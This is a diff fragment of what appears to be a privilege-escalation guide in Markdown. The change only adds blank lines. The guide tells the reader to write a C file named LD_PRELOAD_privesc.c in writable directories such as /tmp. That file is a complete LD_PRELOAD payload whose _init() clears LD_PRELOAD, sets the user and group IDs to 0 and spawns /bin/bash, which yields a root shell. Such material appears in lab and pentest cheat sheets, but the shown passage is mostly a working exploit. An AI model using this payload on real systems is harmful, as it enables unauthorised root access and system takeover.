@@ -13,13 +13,21 @@
 then write C program in the writtable directory such as /var/tmp , /dev/shm and /tmp directory and save it to LD_PRELOAD_privesc.c
 
 > #include <stdio.h>
+
 > #include <sys/types.h>
+
 > #include <stdlib.h> 
+
 > void _init() { 
+
 > unsetenv("LD_PRELOAD"); 
+
 > setgid(0); 
+
 > setuid(0); 
+
 > system("/bin/bash"); 
+
 > }
 
 then compile the file and generate the object file
